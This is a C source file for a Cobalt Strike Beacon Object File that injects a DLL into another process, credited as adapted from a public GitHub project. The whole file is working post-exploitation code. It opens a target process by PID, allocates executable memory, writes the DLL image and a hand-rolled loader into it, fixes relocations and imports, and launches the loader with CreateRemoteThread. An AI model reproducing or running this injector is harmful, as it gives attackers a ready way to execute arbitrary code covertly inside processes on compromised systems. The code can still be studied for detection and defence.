// @author https://github.com/tomcarver16/BOF-DLL-Inject/blob/master/inject.c
// modified slightly to fit my use slightly better

#include <windows.h>
#include "base.h"

typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

// Dll main typedef so that we can invoke it properly from the injector
typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);

typedef struct {
	LPVOID ImageBase;

	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseReloc;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;

} RemoteData;

// Called in the remote process to handle image relocations and imports
DWORD __stdcall LibraryLoader(LPVOID Memory) {

	RemoteData* remoteParams = (RemoteData*)Memory;

	PIMAGE_BASE_RELOCATION pIBR = remoteParams->BaseReloc;

	DWORD64 delta = (DWORD64)((LPBYTE)remoteParams->ImageBase - remoteParams->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta
	
	// Iterate over relocations
	while (pIBR->VirtualAddress) {
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
			int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PWORD list = (PWORD)(pIBR + 1);

			for (size_t i = 0; i < count; i++) {
				if (list[i]) {
					PDWORD64 ptr = (PDWORD64)((LPBYTE)remoteParams->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
					*ptr += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
	}

	PIMAGE_IMPORT_DESCRIPTOR pIID = remoteParams->ImportDirectory;

	// Resolve DLL imports
	while (pIID->Characteristics) {
		PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)remoteParams->ImageBase + pIID->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)remoteParams->ImageBase + pIID->FirstThunk);

		HMODULE hModule = remoteParams->fnLoadLibraryA((LPCSTR)remoteParams->ImageBase + pIID->Name);

		if (!hModule)
			return FALSE;

		while (OrigFirstThunk->u1.AddressOfData) {
			if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				// Import by ordinal
				DWORD64 Function = (DWORD64)remoteParams->fnGetProcAddress(hModule,
					(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			} else {
				// Import by name
				PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)remoteParams->ImageBase + OrigFirstThunk->u1.AddressOfData);
				DWORD64 Function = (DWORD64)remoteParams->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);
				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			OrigFirstThunk++;
			FirstThunk++;
		}
		pIID++;
	}

	// Finally call cast our entry point address to our dllMain typedef
	if (remoteParams->NtHeaders->OptionalHeader.AddressOfEntryPoint) {
		dllmain EntryPoint = (dllmain)((LPBYTE)remoteParams->ImageBase + remoteParams->NtHeaders->OptionalHeader.AddressOfEntryPoint);

		return EntryPoint((HMODULE)remoteParams->ImageBase, DLL_PROCESS_ATTACH, NULL); // Call the entry point
	}
	return TRUE;
}

DWORD __stdcall stub() {
	return 0;
}

void go(char* argv, int argc) {
	PVOID dllBuffer;
    char* sc_ptr;
	int sc_len, procId;
	RemoteData remoteParams;
    datap parser;
	
	BeaconDataParse(&parser, argv, argc);
	sc_ptr = BeaconDataExtract(&parser, &sc_len);
	procId = BeaconDataInt(&parser);

	BeaconPrintf(CALLBACK_OUTPUT, "DLL size: %d bytes, PID: %d", sc_len, procId);

	dllBuffer = (PVOID)sc_ptr;
	// Get DOS Header
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	// Find the NT Header from the e_lfanew attribute
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)dllBuffer + pDosHeader->e_lfanew);

	HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
	if (!hProc) {
		BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu", procId, KERNEL32$GetLastError());
		return;
	}

	PVOID pModAddress = KERNEL32$VirtualAllocEx(hProc, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pModAddress) {
		BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx(dll) failed: %lu", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hProc);
		return;
	}

	KERNEL32$WriteProcessMemory(hProc, pModAddress, dllBuffer,
		pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
	for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		KERNEL32$WriteProcessMemory(hProc, (PVOID)((LPBYTE)pModAddress + pSectHeader[i].VirtualAddress),
			(PVOID)((LPBYTE)dllBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
	}

	// sizeof(RemoteData) + generous space for LibraryLoader code
	#define LOADER_CODE_SIZE 0x1000
	PVOID loaderMem = KERNEL32$VirtualAllocEx(hProc, NULL, sizeof(RemoteData) + LOADER_CODE_SIZE,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!loaderMem) {
		BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx(loader) failed: %lu", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hProc);
		return;
	}

	remoteParams.ImageBase = pModAddress;
	remoteParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pModAddress + pDosHeader->e_lfanew);
	remoteParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pModAddress
		+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	remoteParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pModAddress
		+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	remoteParams.fnLoadLibraryA = LoadLibraryA;
	remoteParams.fnGetProcAddress = GetProcAddress;

	if (!KERNEL32$WriteProcessMemory(hProc, loaderMem, &remoteParams, sizeof(RemoteData), NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory(params) failed: %lu", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hProc);
		return;
	}
	// Copy LibraryLoader function body size must be a compile-time constant to avoid
	// relying on GCC function ordering (stub LibraryLoader can go negative).
	if (!KERNEL32$WriteProcessMemory(hProc, (PVOID)((RemoteData*)loaderMem + 1), (PVOID)LibraryLoader,
		LOADER_CODE_SIZE, NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory(loader) failed: %lu", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hProc);
		return;
	}

	HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
		(LPTHREAD_START_ROUTINE)((RemoteData*)loaderMem + 1), loaderMem, 0, NULL);
	if (!hThread) {
		BeaconPrintf(CALLBACK_ERROR, "CreateRemoteThread failed: %lu", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hProc);
		return;
	}
	KERNEL32$CloseHandle(hThread);

	BeaconPrintf(CALLBACK_OUTPUT, "Finished injecting DLL.");
	KERNEL32$CloseHandle(hProc);

	return;
}